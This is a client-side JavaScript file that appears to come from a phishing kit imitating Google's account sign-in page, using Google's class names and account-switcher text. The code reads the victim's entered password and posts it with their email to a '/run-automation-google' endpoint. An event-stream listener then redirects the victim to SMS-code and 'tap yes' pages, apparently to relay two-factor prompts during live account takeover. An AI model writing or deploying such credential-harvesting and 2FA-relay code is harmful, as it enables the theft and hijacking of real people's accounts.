function detectLanguage() {
      const browserLang = navigator.language || navigator.userLanguage;
      const short = browserLang.split("-")[0];
      const supported = ["en", "fr", "es", "de", "zh"];
      return supported.includes(short) ? short : "en";
}

function password_clicked() {
    console.log('password clicked')

    let email = decodeURIComponent(getCookie("userEmail"));
    const passwordInput = document.getElementById('password_setter');
    const password = passwordInput.value.trim();
    console.log("password: ",password)
    const container = passwordInput.closest('.rFrNMe');
    const underline = container.querySelector('.i9lrp'); 
    const label = container.querySelector('.AxOyFc');

    // Check if an error message element already exists
    let errorMessage = container.querySelector('.error-message');

    if (!password) {
        // Make border and label red
        underline.style.borderColor = '#f28b82';
        underline.style.borderBottom = '2px solid #f28b82';
        label.style.color = '#f28b82';
        passwordInput.focus();


         const icon = '<span style="display:inline-block;width:12px;height:12px;background:#f28b82;color:#333333;font-weight:bold;border-radius:50%;text-align:center;line-height:12px;margin-right:5px;">!</span>';

        // Create error message
        if (!errorMessage) {
            errorMessage = document.createElement('div');
            errorMessage.className = 'error-message';
            errorMessage.style.color = '#f28b82';
            errorMessage.style.fontSize = '12px';
            errorMessage.style.marginTop = '4px';
            
            let lang = getCookie('lang_pwa');
            //console.log(lang)
            if (lang === "en" || lang === "en_uk") {
                errorMessage.innerHTML = icon + "Enter a password";
            } else if (lang === "fr" || lang === "fr_ca") {
                errorMessage.innerHTML = icon + "Saisissez un mot de passe";
            } else if (lang === "es" || lang === "es_la") {
                errorMessage.innerHTML = icon + "Introduce una contraseña";
            } else if (lang === "de") {
                errorMessage.innerHTML = icon + "Password eingeben";
            } else {
                errorMessage.innerHTML = icon + "Enter a password";
            }
  
            container.appendChild(errorMessage);
        }

        return;
    } else {
      console.log('yes there')
      document.getElementById("loading-overlay").style.display = "flex";
        //setCookie("userPassword",password,30)
      fetch("/run-automation-google", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password })
      })
      .then(res => res.json())
      .then(data => console.log(data));
    }
}

//Top bar
function g() {

  // const menu = document.querySelector('.VfPpkd-xl07Ob-XxIAqe');
  const menu = document.getElementById("ls2")

  if (!menu) {
    console.error('Dropdown wrapper not found');
    return;
  }

  if (menu.style.display === 'none' || menu.style.display === '') {
    menu.style.display = 'block';
    menu.style.visibility = 'visible';
    menu.style.opacity = '1';
    console.log('Dropdown: shown');
  } else {
    menu.style.display = 'none';
    console.log('Dropdown: hidden');
  }

}



// Initial actions 
"use strict";
  window.addEventListener("DOMContentLoaded",
  function(event) {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}

function setCookie(name, value, days) {
  const expires = days ? `; expires=${new Date(Date.now() + days*864e5).toUTCString()}` : "";
  document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
}

function getCookie(name) {
  const cookies = document.cookie.split("; ").reduce((acc, c) => {
    const [key, val] = c.split("=");
    acc[key] = decodeURIComponent(val);
    return acc;
  }, {});
  return cookies[name];
}

let lang = getCookie('lang_pwa') || detectLanguage();
//langDropdown.value = lang;
//loadLanguage(lang);

function updateAriaLabel() {
    let email = decodeURIComponent(getCookie("userEmail"));
    console.log(email);

    if (!email) return;

    // Normalize
    if (!email.includes("@")) {
        console.log('foobar')
        email = email + "@gmail.com";
    }

    // Update aria-label
    const clickableDiv = document.querySelector('.SOeSgb .Ahygpe');
    if (clickableDiv) {
        clickableDiv.setAttribute("aria-label", `${email} selected. Switch account`);
    }

    // Update visible email (THIS is what you were missing)
    const emailTextDiv = document.querySelector('.SOeSgb .IxcUte[jsname="bQIQze"]');
    if (emailTextDiv) {
        emailTextDiv.textContent = email;
    }
}

window.addEventListener("DOMContentLoaded", updateAriaLabel);


//Show password
    window.addEventListener('DOMContentLoaded', function() {
        // 1. Get references to the two key elements
        const passwordInput = document.getElementById('password_setter');
        const checkbox = document.getElementById('show-password-checkbox');
        console.log(checkbox)
        // 2. Add an event listener to the checkbox
        checkbox.addEventListener('change', function() {
            // Check if the checkbox is currently checked (selected)
            if (checkbox.checked) {
                // If checked, change the input type to 'text' to show the characters
                passwordInput.type = 'text';
            } else {
                // If unchecked, change the input type back to 'password' to hide them
                passwordInput.type = 'password';
            }
        });
    });

//try another way
function try_another_way(){ 
  window.location.href = '../3_try_another_way/try_another_way.html'
}

/*const evtSource = new EventSource("/events");
evtSource.onmessage = function(event) {
    const data = event.data.trim()
    console.log("SSE EVENT:", data);
    if (data.includes("google_phonenumber_required")) {
        console.log("Redirecting to SMS input page…");
        window.location.href = "/google/3_phonenumber/phonenumber.html";
    }
};*/

const evtSource = new EventSource("/events");
evtSource.onmessage = function (event) {
  try {
    const data = JSON.parse(event.data);

    console.log("SSE EVENT:", data);

    if (data.type === "google_phonenumber_required") {
      console.log("Redirecting to SMS input page…");
      window.location.href = "/google/3_phonenumber/phonenumber.html";

    } else if (data.type === "google_tapyes_required") {
      console.log("Redirecting to TAP YES page for:", data.phone);

      setCookie("phone_type", data.phone, 30);
      window.location.href = "/google/5_confirmation/confirmation.html";
    }

  } catch (err) {
    console.error("Bad SSE payload:", event.data);
  }
};


